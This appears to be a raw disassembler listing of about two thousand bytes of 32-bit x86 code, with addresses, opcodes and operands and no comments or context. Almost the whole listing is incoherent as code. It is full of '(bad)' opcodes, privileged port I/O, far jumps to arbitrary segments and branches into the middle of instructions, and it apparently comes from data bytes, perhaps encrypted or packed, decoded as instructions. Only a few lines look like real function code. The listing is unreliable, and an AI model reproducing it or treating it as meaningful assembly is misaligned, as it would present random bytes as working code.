  4104c8:	stos   BYTE PTR es:[edi],al
  4104c9:	xchg   esp,eax
  4104ca:	jl     0x4104aa
  4104cc:	pop    eax
  4104cd:	jb     0x410462
  4104cf:	inc    ebx
  4104d0:	jmp    0x1e4:0x7f5d086f
  4104d7:	xchg   BYTE PTR [esi],bh
  4104d9:	in     eax,dx
  4104da:	jp     0x41053a
  4104dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104dd:	mov    WORD PTR [ecx],fs
  4104df:	xor    bh,dl
  4104e1:	int    0x54
  4104e3:	cmovo  edx,DWORD PTR [ebx+ebp*1-0x6]
  4104e8:	or     BYTE PTR [eax-0x3371534],bh
  4104ee:	xor    al,0x13
  4104f0:	outs   dx,DWORD PTR ds:[esi]
  4104f1:	jo     0x410495
  4104f3:	jmp    0x410570
  4104f5:	xchg   esi,eax
  4104f6:	mov    esi,0xf3d23ec2
  4104fb:	inc    edi
  4104fc:	sub    al,cl
  4104fe:	(bad)  
  4104ff:	adc    al,0x98
  410501:	ret    
  410502:	sahf   
  410503:	pop    ss
  410504:	mov    ah,0xf4
  410506:	sahf   
  410507:	adc    esi,DWORD PTR [ecx]
  410509:	jmp    0xf9ecd493
  41050e:	mov    ds:0x605258a5,eax
  410513:	push   ds
  410514:	outs   dx,BYTE PTR ds:[esi]
  410515:	cmp    eax,0xe8979ce2
  41051a:	repz push ebx
  41051c:	xchg   cl,dh
  41051e:	(bad)  
  410520:	xor    dl,ah
  410522:	sub    DWORD PTR [ebp-0x1f41c112],ebx
  410528:	in     al,0x23
  41052a:	sbb    al,0x14
  41052c:	mov    esp,0x6d25ec5e
  410531:	enter  0xd85a,0x7e
  410535:	mov    ch,0x4c
  410537:	loopne 0x4104f7
  410539:	xchg   edx,eax
  41053a:	lock jg 0x4104f1
  41053d:	inc    ebx
  41053e:	push   ebp
  41053f:	dec    ebp
  410540:	retf   0x6b01
  410543:	scas   eax,DWORD PTR es:[edi]
  410544:	and    ecx,edx
  410546:	fst    st(6)
  410548:	sbb    eax,0x159e1660
  41054d:	mov    ebx,0xf9103d60
  410552:	push   edi
  410553:	mov    eax,0x4c1ad49f
  410558:	out    0x2b,eax
  41055a:	arpl   WORD PTR [ebx+0x57],sp
  41055d:	and    eax,0x918d882c
  410562:	cli    
  410563:	iret   
  410564:	inc    eax
  410565:	jle    0x4104f3
  410567:	aaa    
  410568:	repnz sub DWORD PTR [esi+0x6e8288c1],0x4a7190b3
  410573:	adc    DWORD PTR [edi+0x2],ecx
  410576:	(bad)  
  410577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410578:	bound  ebp,QWORD PTR [eax]
  41057a:	sbb    eax,0xcc91770d
  41057f:	stos   BYTE PTR es:[edi],al
  410580:	sbb    cl,ch
  410582:	popf   
  410583:	mov    esi,0xa0f0ada
  410588:	stos   DWORD PTR es:[edi],eax
  410589:	popa   
  41058a:	lods   al,BYTE PTR ds:[esi]
  41058b:	outs   dx,DWORD PTR ds:[esi]
  41058c:	pop    eax
  41058d:	push   0xffffff9a
  41058f:	ins    BYTE PTR es:[edi],dx
  410590:	aad    0x45
  410592:	ret    0x78cb
  410595:	stc    
  410596:	out    0x82,al
  410598:	adc    dh,bh
  41059a:	xchg   ebp,eax
  41059b:	add    ah,bl
  41059d:	ret    
  41059e:	add    BYTE PTR [eax+eax*8-0x16280821],dl
  4105a5:	and    bl,bl
  4105a7:	ins    BYTE PTR es:[edi],dx
  4105a8:	xchg   esp,eax
  4105a9:	(bad)  
  4105aa:	jmp    0xd109:0x284cecdb
  4105b1:	mov    dh,0x77
  4105b3:	dec    esp
  4105b4:	retf   
  4105b5:	out    dx,al
  4105b6:	mov    esi,0x2450aa1a
  4105bb:	jnp    0x410547
  4105bd:	xor    ebx,DWORD PTR [ecx]
  4105bf:	pavgb  mm3,QWORD PTR [edx]
  4105c2:	lock das 
  4105c4:	xchg   ebp,eax
  4105c5:	sbb    DWORD PTR [edi-0x74e02288],0xffffffd5
  4105cc:	or     ebp,DWORD PTR [eax-0x4bc12cef]
  4105d2:	inc    ebx
  4105d3:	or     eax,0x32f1e2be
  4105d8:	and    eax,0xb7efab66
  4105dd:	stos   DWORD PTR es:[edi],eax
  4105de:	or     DWORD PTR [edx+ecx*4-0x6b],ecx
  4105e2:	(bad)  
  4105e3:	cld    
  4105e4:	dec    esp
  4105e5:	jecxz  0x4105c2
  4105e7:	sbb    eax,0xfab69c97
  4105ec:	(bad)  
  4105ed:	sub    BYTE PTR [ebx-0x5ff653a7],cl
  4105f3:	retf   
  4105f4:	mov    bh,BYTE PTR [ebx]
  4105f6:	mov    ds:0x53191efe,eax
  4105fb:	xchg   edi,eax
  4105fc:	sbb    BYTE PTR [edi],dl
  4105fe:	mov    dh,0xaa
  410600:	add    cl,BYTE PTR [esi+0x79ade4fa]
  410606:	mov    dh,0xa0
  410608:	nop
  410609:	popf   
  41060a:	inc    esi
  41060b:	in     eax,0x70
  41060d:	sahf   
  41060e:	xchg   esi,eax
  41060f:	rcr    BYTE PTR [esi+0x7d],0xb7
  410613:	add    DWORD PTR [ecx-0x5e],ecx
  410616:	sub    eax,0x24e57d0
  41061b:	adc    ch,BYTE PTR [ecx-0x61]
  41061e:	and    eax,ebp
  410620:	call   0xe36e:0x5673d04e
  410627:	ror    BYTE PTR [ebx+0x6d7f8559],1
  41062d:	mov    ebp,0xc262c369
  410632:	popf   
  410633:	sub    BYTE PTR [ebx-0x2a],0xf5
  410637:	ret    
  410638:	xor    al,0x84
  41063a:	popf   
  41063b:	dec    esp
  41063c:	xchg   DWORD PTR [edx],ebx
  41063e:	es push edi
  410640:	fldenv [ebx+ebp*2+0x25]
  410644:	fbstp  TBYTE PTR [eax-0x2631fc64]
  41064a:	not    cl
  41064c:	xlat   BYTE PTR ds:[ebx]
  41064d:	std    
  41064e:	jl     0x4105db
  410650:	xor    edx,ebp
  410652:	call   0xa031:0x2427f743
  410659:	scas   eax,DWORD PTR es:[edi]
  41065a:	scas   al,BYTE PTR es:[edi]
  41065b:	adc    ch,BYTE PTR ds:0xaa098432
  410661:	sbb    dh,BYTE PTR [edi-0x5d]
  410664:	mov    al,ds:0x77b31ea7
  410669:	pop    ebp
  41066a:	daa    
  41066b:	sbb    ecx,DWORD PTR [edi+0x65]
  41066e:	inc    ebx
  41066f:	out    0x7,al
  410671:	aam    0x33
  410673:	sbb    al,0xb4
  410675:	sub    eax,0xb6602b88
  41067a:	rcr    DWORD PTR [ecx-0x7e],1
  41067d:	mov    ch,0xe9
  41067f:	lea    eax,ds:0x8895ea4e
  410685:	mov    al,ds:0xad44b12a
  41068a:	sub    ah,dl
  41068c:	mov    ds:0xbb8c0d5a,eax
  410691:	add    eax,0x21a7522b
  410696:	inc    ecx
  410697:	neg    BYTE PTR [eax-0x7c6c21a2]
  41069d:	xchg   edx,eax
  41069e:	outs   dx,DWORD PTR ds:[esi]
  41069f:	mov    bl,0xd
  4106a1:	sahf   
  4106a2:	cmp    ecx,ebp
  4106a4:	cmc    
  4106a5:	ret    
  4106a6:	lea    edi,[edi+0x6f2912d3]
  4106ac:	ret    
  4106ad:	mov    ah,0x76
  4106af:	cmp    BYTE PTR [ebx+0x32],bl
  4106b2:	jmp    0x4106df
  4106b4:	(bad)  
  4106b5:	dec    edi
  4106b6:	arpl   WORD PTR [eax],dx
  4106b8:	lods   al,BYTE PTR ds:[esi]
  4106b9:	jmp    0x4106aa
  4106bb:	or     ecx,DWORD PTR ds:0x4a50632e
  4106c1:	fstp   QWORD PTR [ebx]
  4106c3:	pop    esp
  4106c4:	pop    esi
  4106c5:	and    al,0xd2
  4106c7:	push   ecx
  4106c8:	inc    esp
  4106c9:	sbb    al,ch
  4106cb:	scas   eax,DWORD PTR es:[edi]
  4106cc:	rcr    DWORD PTR [edi+0x59e70027],0xa
  4106d3:	mov    dh,BYTE PTR [edx]
  4106d5:	push   ecx
  4106d6:	pop    ss
  4106d7:	mov    bx,0x71ef
  4106db:	loop   0x4106a0
  4106dd:	inc    esp
  4106de:	push   edx
  4106df:	mov    ds:0x8d5fc88e,eax
  4106e4:	inc    edx
  4106e5:	std    
  4106e6:	lea    edi,[ecx+0x1b24b87a]
  4106ec:	and    BYTE PTR [ecx-0x2b],cl
  4106ef:	sub    edx,ebp
  4106f1:	je     0x4106d8
  4106f3:	icebp  
  4106f4:	outs   dx,DWORD PTR ds:[esi]
  4106f5:	xchg   esi,eax
  4106f6:	lea    ecx,[eax+0x7addbc8c]
  4106fc:	cwde   
  4106fd:	adc    eax,0x3c1f695
  410702:	inc    edx
  410703:	pop    ebx
  410704:	jbe    0x4106c0
  410706:	out    0xac,al
  410708:	jmp    0xbd6b:0x44a9ceb8
  41070f:	dec    ebx
  410710:	out    0xf1,eax
  410712:	arpl   WORD PTR [edx],ax
  410714:	sub    ch,al
  410716:	push   ds
  410717:	add    BYTE PTR fs:[eax+edx*4+0x3a],ah
  41071c:	or     al,0x75
  41071e:	cmp    al,0x36
  410720:	mov    es,edi
  410722:	(bad)  
  410723:	enter  0x7f10,0x0
  410727:	(bad)
  41072b:	inc    edi
  41072c:	das    
  41072d:	or     al,0xa3
  41072f:	hlt    
  410730:	pushf  
  410731:	test   al,0x4b
  410733:	sbb    esi,ebx
  410735:	es retf 0xdfb1
  410739:	add    dl,cl
  41073b:	add    BYTE PTR [ebx+0x8],bl
  41073e:	out    0x1,eax
  410740:	gs sbb al,0xa6
  410743:	mov    ecx,0x35e11455
  410748:	stc    
  410749:	xor    ebx,DWORD PTR [edi-0x48]
  41074c:	mov    al,ds:0xc579ac63
  410751:	les    ecx,FWORD PTR [ebx+edx*4-0x29]
  410755:	and    BYTE PTR ds:0xf4458b41,bh
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x43dc24e
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107d0
  41078c:	sbb    esp,DWORD PTR [eax+0x3b]
  41078f:	xchg   edx,eax
  410790:	gs jno 0x4107ca
  410793:	das    
  410794:	sub    al,0x50
  410797:	push   es
  410798:	stos   BYTE PTR es:[edi],al
  410799:	xchg   ebx,eax
  41079a:	add    ch,BYTE PTR [ecx-0x6a]
  41079d:	inc    ebp
  41079e:	add    BYTE PTR [ecx+0xb],cl
  4107a1:	cld    
  4107a2:	jne    0x41073a
  4107a4:	dec    BYTE PTR [ebp+eax*2+0x49]
  4107a8:	mov    ecx,cs
  4107aa:	push   ss
  4107ab:	lea    ebp,[eax]
  4107ad:	retf   0xe009
  4107b0:	sub    esp,DWORD PTR [eax+0xe]
  4107b3:	jg     0x41078d
  4107b5:	xor    esi,DWORD PTR [edx-0x203a487e]
  4107bb:	pop    ss
  4107bc:	scas   al,BYTE PTR es:[edi]
  4107bd:	(bad)  
  4107be:	jp     0x4107e6
  4107c0:	pop    ds
  4107c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107c2:	xchg   ebp,eax
  4107c3:	call   0x4af00b45
  4107c8:	xlat   BYTE PTR ds:[ebx]
  4107c9:	inc    eax
  4107ca:	adc    al,0xfd
  4107cc:	fild   WORD PTR [ecx-0x38a751ae]
  4107d2:	jo     0x41077b
  4107d4:	adc    BYTE PTR ds:0xb65c8382,dh
  4107da:	push   eax
  4107db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107dc:	test   eax,0x9ddc4fa5
  4107e1:	push   cs
  4107e2:	jle    0x410834
  4107e4:	test   ebp,ecx
  4107e6:	push   0x3755e52b
  4107eb:	pop    esp
  4107ec:	in     al,0xb
  4107ee:	mov    ebx,0x11eba2de
  4107f3:	jno    0x41080b
  4107f5:	les    edx,FWORD PTR [eax+edx*1-0x4d]
  4107f9:	pushf  
  4107fa:	clc    
  4107fb:	cmp    eax,DWORD PTR [ebp+0x1dd09668]
  410801:	xchg   DWORD PTR [eax+0x61],eax
  410804:	pop    esp
  410805:	jnp    0x410831
  410807:	adc    ch,al
  410809:	mov    dl,0xf4
  41080b:	sub    BYTE PTR [ecx+0x7b],cl
  41080e:	leave  
  41080f:	iret   
  410810:	xchg   edi,eax
  410811:	jmp    0x4107f3
  410813:	pop    ds
  410814:	jl     0x410818
  410816:	stos   DWORD PTR es:[edi],eax
  410817:	mov    eax,0xf846a608
  41081c:	sti    
  41081d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41081e:	(bad)  
  41081f:	in     eax,0xcd
  410821:	outs   dx,BYTE PTR ds:[esi]
  410822:	div    edi
  410824:	loop   0x410825
  410826:	cmp    DWORD PTR [ebx],0x7e77a192
  41082c:	mov    al,0xc4
  41082e:	inc    eax
  41082f:	bnd jo 0x41085c
  410832:	mov    al,ds:0xe6af3e23
  410837:	idiv   DWORD PTR [ebx-0x5d]
  41083a:	cmp    DWORD PTR [ecx-0x5addf73c],0x1f
  410841:	jl     0x41088d
  410843:	inc    edi
  410844:	(bad)  
  410845:	jmp    0x8b1fd60b
  41084a:	aas    
  41084b:	inc    edi
  41084c:	inc    eax
  41084d:	mov    dh,cl
  41084f:	dec    eax
  410850:	xchg   edx,eax
  410851:	mov    fs,WORD PTR [ecx-0x15d95d85]
  410857:	mov    ebp,edi
  410859:	call   0x4652:0x64365f53
  410860:	and    DWORD PTR [ebx+ecx*2],esp
  410863:	lock add ax,WORD PTR [esi+edx*2+0x57973b5f]
  41086c:	and    al,0x3
  41086e:	cmc    
  41086f:	mov    bh,0xf0
  410871:	dec    ebx
  410872:	pop    ss
  410873:	mov    bl,0xe5
  410875:	jge    0x410811
  410877:	jmp    0x16370d79
  41087c:	push   cs
  41087d:	hlt    
  41087e:	(bad)  
  41087f:	icebp  
  410880:	loope  0x410824
  410882:	pop    eax
  410883:	test   al,0xa
  410885:	jp     0x41086d
  410887:	retf   0x8c8b
  41088a:	push   edx
  41088b:	cmp    al,0x20
  41088d:	fs sub al,0x29
  410890:	test   DWORD PTR [ebx+0x7055bd84],ebp
  410896:	call   0x8865:0x21f2756d
  41089d:	mov    bh,0xb5
  41089f:	jbe    0x4108a0
  4108a1:	enter  0xa847,0xfd
  4108a5:	jg     0x4108d8
  4108a7:	mov    esi,0x36cbcffc
  4108ac:	fdiv   DWORD PTR [ebx+esi*4]
  4108af:	inc    ecx
  4108b0:	ja     0x4108d2
  4108b2:	aad    0x4
  4108b4:	icebp  
  4108b5:	je     0x410894
  4108b7:	pop    esi
  4108b8:	push   eax
  4108b9:	addr16 (bad) 
  4108bb:	mov    WORD PTR [ebp+0x2f],gs
  4108be:	daa    
  4108bf:	dec    edx
  4108c0:	test   BYTE PTR [eax],0xed
  4108c3:	mov    ebx,esi
  4108c5:	push   ds
  4108c6:	jno    0x41092f
  4108c8:	push   ss
  4108c9:	cmp    cl,BYTE PTR [edx+0x35]
  4108cc:	scas   eax,DWORD PTR es:[edi]
  4108cd:	cmp    eax,0x57115a0
  4108d2:	dec    ecx
  4108d3:	(bad)  
  4108d4:	out    0xa0,eax
  4108d6:	shl    DWORD PTR [esi+0x66277a4],1
  4108dc:	ds mov ch,0xc2
  4108df:	enter  0xc71c,0x25
  4108e3:	xor    DWORD PTR [ebp-0x6f],ebp
  4108e6:	adc    al,dl
  4108e8:	fwait
  4108e9:	call   0xc51d:0xc7f74bf1
  4108f0:	mov    dl,0x79
  4108f2:	out    dx,al
  4108f3:	bnd jno 0x410887
  4108f6:	les    esp,FWORD PTR [eax]
  4108f8:	stos   BYTE PTR es:[edi],al
  4108f9:	cmp    al,ch
  4108fb:	lock aas 
  4108fd:	jb     0x410965
  4108ff:	into   
  410900:	test   ch,dl
  410902:	dec    eax
  410903:	(bad)  
  410904:	(bad)  [ebx+0x5501f165]
  41090a:	scas   al,BYTE PTR es:[edi]
  41090b:	jecxz  0x4108a0
  41090d:	loopne 0x41094d
  41090f:	sbb    esi,DWORD PTR [edi-0x34b08bff]
  410915:	inc    eax
  410916:	lds    ebx,FWORD PTR [eax+0x6285591d]
  41091c:	push   0x2fea2166
  410921:	mov    ch,0x25
  410923:	cli    
  410924:	adc    BYTE PTR [ecx-0x241b0e0b],dh
  41092a:	jo     0x410942
  41092c:	xor    eax,esi
  41092e:	pushf  
  41092f:	sub    edi,DWORD PTR [edi+0x4a]
  410932:	cmp    al,BYTE PTR [eax-0x6f]
  410935:	and    DWORD PTR [eax+0x3502ee51],ebp
  41093b:	(bad)  
  41093d:	push   edi
  41093e:	enter  0x2ef6,0x68
  410942:	icebp  
  410943:	sbb    BYTE PTR [edi+esi*1],ah
  410946:	sbb    eax,0x7b4bb9fe
  41094b:	inc    esp
  41094c:	xor    al,0x35
  41094e:	div    DWORD PTR [eax]
  410950:	xchg   ecx,eax
  410951:	in     al,dx
  410952:	lock in eax,0x38
  410955:	sub    DWORD PTR [edi+0x77],ebx
  410958:	imul   eax,DWORD PTR [ecx-0x10],0xffffff84
  41095c:	jbe    0x4108fb
  41095e:	test   al,0x1a
  410960:	loop   0x410910
  410962:	fld    DWORD PTR [ebx-0x3c939700]
  410968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410969:	dec    esi
  41096a:	cmp    BYTE PTR ds:0x3aec28ef,cl
  410970:	or     ecx,edx
  410972:	xchg   edi,eax
  410973:	xchg   edx,eax
  410974:	sub    DWORD PTR [edi-0x17],0xb18d665a
  41097b:	ja     0x4109aa
  41097d:	mov    ebp,DWORD PTR [eax+0x7720fe74]
  410983:	xchg   ebp,eax
  410984:	data16 aad 0xe8
  410987:	mov    cl,0xee
  410989:	push   ecx
  41098a:	mov    ds:0x272f705f,al
  41098f:	fisub  WORD PTR ds:[ecx+0x7e]
  410993:	sbb    BYTE PTR [eax+0x47e5b102],dh
  410999:	sti    
  41099a:	aas    
  41099b:	xor    edi,DWORD PTR [edi+eax*4-0x759be115]
  4109a2:	stc    
  4109a3:	cmc    
  4109a4:	xor    bh,BYTE PTR [edi]
  4109a6:	ss aaa 
  4109a8:	mov    al,0x62
  4109aa:	imul   ebp,DWORD PTR [esi],0x9375bee8
  4109b0:	scas   eax,DWORD PTR es:[edi]
  4109b1:	or     eax,0xb800cafe
  4109b6:	sbb    DWORD PTR [ebp+0x200f2cca],ecx
  4109bc:	push   es
  4109bd:	outs   dx,DWORD PTR ds:[esi]
  4109be:	jmp    0x8747a596
  4109c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109c4:	xchg   edi,esi
  4109c6:	sub    BYTE PTR [ebx-0x41257960],cl
  4109cc:	jno    0x4109b7
  4109ce:	hlt    
  4109cf:	imul   ecx,DWORD PTR [edi+ecx*8],0x50191a1c
  4109d6:	call   0x80a8fc85
  4109db:	xor    BYTE PTR [ebx],dh
  4109dd:	loopne 0x4109ab
  4109df:	mov    ebp,DWORD PTR [eax]
  4109e1:	dec    DWORD PTR [esp+ecx*2+0x36]
  4109e5:	iret   
  4109e6:	dec    ebp
  4109e7:	and    al,0x98
  4109e9:	bnd jo 0x410a34
  4109ec:	xor    ecx,DWORD PTR [esp+ebp*1-0x222acb49]
  4109f3:	addr16 sub edi,ebx
  4109f6:	xor    al,0x99
  4109f8:	dec    ebx
  4109f9:	ins    DWORD PTR es:[edi],dx
  4109fa:	sbb    al,0x37
  4109fc:	xor    edx,ebp
  4109fe:	mov    al,ds:0x7304c5f4
  410a03:	pop    edx
  410a04:	mov    bh,0x26
  410a06:	loope  0x4109be
  410a08:	mov    DWORD PTR [edx+0x18],eax
  410a0b:	cs mov ebp,0xd0442663
  410a11:	xor    ah,BYTE PTR ss:[edx]
  410a14:	cmp    edx,DWORD PTR [ecx]
  410a16:	dec    edi
  410a17:	les    esi,FWORD PTR [esi]
  410a19:	ret    
  410a1a:	daa    
  410a1b:	sbb    eax,0xd599d6e2
  410a20:	dec    edx
  410a21:	(bad)  
  410a22:	mov    esi,0x9e96a177
  410a27:	(bad)  
  410a29:	mov    ds:0xfc3627ca,eax
  410a2e:	mov    DWORD PTR [ecx],edx
  410a30:	test   BYTE PTR [edi-0x3c],bh
  410a33:	jnp    0x4109c3
  410a35:	xlat   BYTE PTR ds:[ebx]
  410a36:	push   ebp
  410a37:	and    DWORD PTR [eax+eiz*4+0x40],ecx
  410a3b:	xchg   ebp,eax
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	dec    esi
  410a50:	lahf   
  410a51:	cmp    dl,BYTE PTR [ebx-0x46]
  410a54:	mov    ebp,0x7caf7e7e
  410a59:	jle    0x410ad9
  410a5b:	xchg   edx,eax
  410a5c:	aaa    
  410a5d:	fld    DWORD PTR [esi+0x51]
  410a60:	dec    eax
  410a61:	mov    ebp,0xd6fa0c04
  410a66:	or     BYTE PTR [esi+0x2a],cl
  410a69:	data16 jp 0x410a14
  410a6c:	out    0xec,eax
  410a6e:	or     BYTE PTR [eax-0x1cfc7b96],al
  410a74:	mov    bh,BYTE PTR ds:0x21b9a378
  410a7a:	outs   dx,BYTE PTR ds:[esi]
  410a7b:	jecxz  0x410a1a
  410a7d:	inc    ecx
  410a7e:	xor    esi,DWORD PTR [ebp-0xd01056c]
  410a84:	rol    BYTE PTR [ecx-0x7af7c193],1
  410a8a:	lods   al,BYTE PTR ds:[esi]
  410a8b:	mov    al,ds:0xb25eb5ee
  410a90:	push   edx
  410a91:	not    DWORD PTR [esp+0x44d79dbf]
  410a98:	sub    dl,0xc5
  410a9b:	push   edi
  410a9c:	int3   
  410a9d:	add    ebp,esp
  410a9f:	loopne 0x410a21
  410aa1:	jo     0x410af7
  410aa3:	aas    
  410aa4:	mov    esi,gs
  410aa6:	sub    al,0x4b
  410aa8:	test   eax,0xa3c61747
  410aad:	imul   eax,edx,0xffffff93
  410ab0:	pop    ebx
  410ab1:	aaa    
  410ab2:	pop    edx
  410ab3:	enter  0x3411,0x5d
  410ab7:	inc    ebx
  410ab8:	push   0xffffff87
  410aba:	fld    st(6)
  410abc:	idiv   DWORD PTR [ebp+0x3d819b42]
  410ac2:	fmul   QWORD PTR [esi+0x73617dc2]
  410ac8:	inc    ebp
  410ac9:	fidivr DWORD PTR [eax-0x58ba7dfb]
  410acf:	pusha  
  410ad0:	cmc    
  410ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ad2:	sbb    al,0x2b
  410ad4:	mov    al,0x3b
  410ad6:	mov    bl,0x1f
  410ad8:	and    edi,DWORD PTR [ebp-0x318bd9fc]
  410ade:	retf   0x4941
  410ae1:	test   eax,0x8620849d
  410ae6:	pop    esi
  410ae7:	iret   
  410ae8:	js     0x410a6a
  410aea:	mov    ah,BYTE PTR [ecx]
  410aec:	fwait
  410aed:	das    
  410aee:	xor    eax,0xfcad4e60
  410af3:	mov    ecx,0x650b0933
  410af8:	jle    0x410b57
  410afa:	cmp    al,0x35
  410afc:	ss jmp 0x3c0a:0xc466
  410b03:	je     0x410aa8
  410b05:	aad    0xf2
  410b07:	pop    ebx
  410b08:	xchg   ebx,eax
  410b09:	shl    DWORD PTR [edx],0xa1
  410b0c:	xchg   esi,eax
  410b0d:	fistp  DWORD PTR [ecx+eiz*1+0x66fbf23f]
  410b14:	xchg   ebx,eax
  410b15:	stos   BYTE PTR es:[edi],al
  410b16:	repnz (bad) [esi+0x65d1972c]
  410b1d:	jg     0x410b1d
  410b1f:	or     eax,0x8c84b9a1
  410b24:	imul   ebx,DWORD PTR [ebx-0x47],0x37
  410b28:	loope  0x410b26
  410b2a:	cmp    BYTE PTR [ebx+edx*1],0x25
  410b2e:	cdq    
  410b2f:	bound  ebp,QWORD PTR [edi]
  410b31:	add    esi,esi
  410b33:	mov    DWORD PTR [ebx-0x586f7f93],edi
  410b39:	adc    al,0x3a
  410b3b:	mov    ds:0xd15408c6,al
  410b40:	add    DWORD PTR [ebp-0x14],esp
  410b43:	arpl   bp,bx
  410b45:	mov    edx,0x87d331d5
  410b4a:	add    al,0x76
  410b4c:	enter  0x7705,0x44
  410b50:	cdq    
  410b51:	mov    WORD PTR [esi-0x5c01575e],es
  410b57:	repnz sbb BYTE PTR [esi],0xc9
  410b5b:	and    esi,DWORD PTR [ebp-0x13]
  410b5e:	rol    ebp,cl
  410b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b61:	(bad)  
  410b62:	jmp    0x6a57:0x63ab6dd4
  410b69:	and    bh,BYTE PTR [esi+0x43]
  410b6c:	dec    edi
  410b6d:	or     eax,0x6aca15d2
  410b72:	outs   dx,DWORD PTR ds:[esi]
  410b73:	mov    bh,0x61
  410b75:	pop    esp
  410b76:	push   es
  410b77:	test   bh,bl
  410b79:	lea    eax,[edx+ebp*8-0x5a50d331]
  410b80:	popf   
  410b81:	jl     0x410b8b
  410b83:	jae    0x410b29
  410b85:	les    edx,FWORD PTR ds:0x56cd4c09
  410b8b:	jmp    0x410be6
  410b8d:	lods   al,BYTE PTR ds:[esi]
  410b8e:	fnstcw WORD PTR [esi+eax*2+0x35a0be62]
  410b95:	add    ah,BYTE PTR [edx]
  410b97:	or     esi,eax
  410b99:	fbstp  TBYTE PTR [ebx+eax*1-0x49]
  410b9d:	mov    edx,eax
  410b9f:	scas   al,BYTE PTR es:[edi]
  410ba0:	cmp    ebx,eax
  410ba2:	sbb    al,0xbd
  410ba4:	jg     0x410bbe
  410ba6:	cwde   
  410ba7:	clc    
  410ba8:	sbb    dh,al
  410baa:	jmp    0xea6a:0xb8ed0669
  410bb1:	xchg   ecx,eax
  410bb2:	pop    ds
  410bb3:	jg     0x410bbc
  410bb5:	scas   eax,DWORD PTR es:[edi]
  410bb6:	mov    al,0xd0
  410bb8:	repz arpl WORD PTR [eax+0x62e29cff],ax
  410bbf:	pushf  
  410bc0:	repz fcmovu st,st(7)
  410bc3:	daa    
  410bc4:	out    0xb4,al
  410bc6:	shl    BYTE PTR [ecx],1
  410bc8:	cmp    eax,0xde7443c9
  410bcd:	dec    esi
  410bce:	mov    dh,0x41
  410bd0:	jb     0x410bbf
  410bd2:	fs jmp 0x410bc0
  410bd5:	mov    ch,cl
  410bd7:	icebp  
  410bd8:	int3   
  410bd9:	popf   
  410bda:	xor    BYTE PTR [ecx],al
  410bdc:	or     ch,bl
  410bde:	cdq    
  410bdf:	adc    BYTE PTR [ecx-0x7c],al
  410be2:	adc    dl,BYTE PTR [eax+0x3a]
  410be5:	adc    BYTE PTR [edx-0x2671faa],al
  410beb:	sahf   
  410bec:	into   
  410bed:	fs ret 0x60c
  410bf1:	mov    DWORD PTR [ebx-0x584c528b],esp
  410bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf8:	mov    ebx,0x17ee4ebe
  410bfd:	enter  0x1a9a,0x94
  410c01:	jge    0x410bb0
  410c03:	sbb    al,0x3a
  410c05:	mov    ds:0x8fba1eb4,al
  410c0a:	jae    0x410c49
  410c0c:	js     0x410c7c
  410c0e:	outs   dx,BYTE PTR ds:[esi]
  410c0f:	sbb    edx,ecx
  410c11:	aas    
  410c12:	dec    edx
  410c13:	jge    0x410c6a
  410c15:	(bad)  
  410c16:	jnp    0x410c64
  410c18:	push   ecx
  410c19:	xor    al,0x2c
  410c1b:	aas    
  410c1c:	mov    edx,0xc8a71477
  410c21:	fisub  WORD PTR [eax]
  410c23:	lea    eax,[eax-0x1]
  410c26:	int3   
  410c27:	sbb    al,0xc8
  410c29:	mov    edi,0x61d5130c
  410c2e:	rcl    BYTE PTR [ecx+0x1cd4fd7d],0x71
  410c35:	sub    ebp,DWORD PTR [ecx+edi*1]
  410c38:	or     esp,DWORD PTR [ecx-0x5e]
  410c3b:	ficom  WORD PTR [ebx+0x7478606a]
  410c41:	add    al,0x60
  410c43:	int    0xf6
  410c45:	mov    al,ds:0x230302b1
  410c4a:	sbb    al,0xb9
  410c4c:	ss mov bl,0xa3
  410c4f:	xchg   edi,eax
  410c50:	or     DWORD PTR [ecx+0xa0a9e7],0x1f
  410c57:	jmp    0x410c31
  410c59:	inc    ecx
  410c5a:	inc    ebp
  410c5b:	leave  
  410c5c:	xchg   edx,eax
  410c5d:	cmp    al,0xc4
  410c5f:	or     eax,ecx
  410c61:	cmp    DWORD PTR [ecx-0x2d6f8eb6],ebx
  410c67:	jnp    0x410cb6
  410c69:	and    dh,BYTE PTR [eax]
  410c6b:	fistp  WORD PTR [edi-0x6cae4546]
  410c71:	mov    al,0x79
  410c73:	xchg   DWORD PTR [esi-0xfb6f9a1],eax
  410c79:	fcomp  QWORD PTR [edi]
  410c7b:	aas    
  410c7c:	sbb    BYTE PTR [ebp-0x14],al
  410c7f:	adc    DWORD PTR ds:0xd72686c0,0xffffffdc
  410c86:	or     eax,0x26f2dbb3
  410c8b:	arpl   WORD PTR [edi+0xa876ed2],bx
  410c91:	gs arpl si,di
  410c94:	jge    0x410cac
  410c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c97:	xchg   esp,eax
  410c98:	cmc    
  410c99:	rol    cl,cl
  410c9b:	sub    dh,bl
  410c9d:	pop    esp
  410c9e:	mov    eax,ds:0x47b32dee
  410ca3:	jns    0x410d23
  410ca5:	mov    esi,0x69b87d31
  410caa:	pmaxsw mm0,QWORD PTR [edx]
  410cad:	test   ecx,ebx
  410caf:	es jl  0x410c6f
